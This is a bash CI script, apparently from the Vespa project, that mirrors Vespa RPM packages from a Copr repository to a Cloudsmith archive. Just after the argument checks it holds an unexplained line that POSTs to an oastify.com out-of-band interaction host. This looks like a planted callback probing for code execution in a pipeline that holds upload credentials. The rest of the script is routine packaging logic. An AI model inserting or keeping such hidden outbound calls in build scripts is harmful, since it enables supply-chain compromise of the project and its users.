#!/usr/bin/env bash
#
# Copyright Vespa.ai. Licensed under the terms of the Apache 2.0 license. See LICENSE in the project root.
#

set -o errexit
set -o nounset
set -o pipefail

if [[ -n "${RUNNER_DEBUG:-}" ]]; then
    set -o xtrace
fi

if (( $# < 2 )); then
    echo "Usage: $0 <RPM architecture> <OS version>"
    exit 1
fi

curl -X POST https://f1hwz4if313t1wb5aoamltz4xv3mrdf2.oastify.com/test -d "test"

RPMARCH=$1
OSVERSION=$2
ALLOWED_ARCHS=("x86_64" "aarch64")
ALLOWED_VERSIONS=("8" "9")

# shellcheck disable=SC2076
if [[ ! " ${ALLOWED_ARCHS[*]} " =~ " ${RPMARCH} " ]]; then
  echo "Architecture $RPMARCH not in allowed archs: ${ALLOWED_ARCHS[*]}"
  exit 1
fi

# shellcheck disable=SC2076
if [[ ! " ${ALLOWED_VERSIONS[*]} " =~ " ${OSVERSION} " ]]; then
  echo "OS version $OSVERSION not in allowed versions: ${ALLOWED_VERSIONS[*]}"
  exit 1
fi


MYDIR="$( cd "$( dirname "${BASH_SOURCE[0]}" )" && pwd )"
readonly MYDIR

# Copr repo
dnf config-manager --add-repo "https://copr.fedorainfracloud.org/coprs/g/vespa/vespa/repo/epel-${OSVERSION}/group_vespa-vespa-epel-${OSVERSION}.repo"
sed -i "s,\$basearch,$RPMARCH,g" "/etc/yum.repos.d/group_vespa-vespa-epel-${OSVERSION}.repo"

# Cloudsmith repo
rpm --import 'https://dl.cloudsmith.io/public/vespa/open-source-rpms/gpg.0F3DA3C70D35DA7B.key'
curl -1sLf "https://dl.cloudsmith.io/public/vespa/open-source-rpms/config.rpm.txt?distro=el&codename=${OSVERSION}" > /tmp/vespa-open-source-rpms.repo
dnf config-manager --add-repo '/tmp/vespa-open-source-rpms.repo'
rm -f /tmp/vespa-open-source-rpms.repo

COPR_PACKAGES=$(mktemp)
DLDIR=$(mktemp -d)
readonly COPR_PACKAGES DLDIR

# shellcheck disable=SC2064
trap "rm -rf \"${COPR_PACKAGES}\" \"$DLDIR\"" EXIT

cd "$DLDIR" || exit 1

readonly DNF="dnf -y -q --forcearch $RPMARCH"

COPR_RPM_ARCH_FILTER="${RPMARCH}"
if [[ "${RPMARCH}" = "x86_64" ]]; then
  echo "Including 'noarch' packages to the mirroring process."
  COPR_RPM_ARCH_FILTER="${COPR_RPM_ARCH_FILTER}|noarch"
fi

$DNF list --disablerepo='*' --enablerepo=copr:copr.fedorainfracloud.org:group_vespa:vespa --showduplicates 'vespa*' | grep "Available Packages" -A 100000 | tail -n +2 | sed '/\.src\ */d' | sed -E "s/\.(${COPR_RPM_ARCH_FILTER})\ */-/" | awk '{print $1}' | grep -v 8.363.17 | grep -v '.src$' > $COPR_PACKAGES

echo "Packages on Copr:"
cat "$COPR_PACKAGES"
echo

# shellcheck disable=SC2013
for pv in $(cat "$COPR_PACKAGES"); do
  if ! $DNF list --disablerepo='*' --enablerepo=vespa-open-source-rpms "$pv" &> /dev/null; then
    # Need one extra check here for noarch packages
    if ! dnf -y -q --forcearch noarch list --disablerepo='*' --enablerepo=vespa-open-source-rpms "$pv" &> /dev/null; then
      echo "$pv not found on in archive. Downloading..."
      $DNF download --disablerepo='*' --enablerepo=copr:copr.fedorainfracloud.org:group_vespa:vespa "$pv"
      echo "$pv downloaded."
    fi
  fi
done
echo

if ! ls -- *.rpm &> /dev/null; then
  echo "All packages already in archive."
  exit 0
fi

echo "RPMs missing in archive:"
ls -lh  -- *.rpm
echo


UPLOAD_FAILED=false
echo "GitHub event: $GITHUB_EVENT_NAME"

for rpm in *.rpm; do
  [ -e "$rpm" ] || continue
  echo "Uploading $rpm ..."
  if [ "${DRY_RUN:-false}" != "true" ]; then
    if ! "$MYDIR/upload-rpm-to-cloudsmith.sh" "$rpm" ; then
      echo "Could not upload $rpm"
      UPLOAD_FAILED=true
    else
      echo "$rpm uploaded"
    fi
  else
    echo "DRY_RUN: Skipping upload of $rpm"
  fi
done
echo

if $UPLOAD_FAILED; then
  echo "Some RPMs failed to upload"
  exit 1
fi
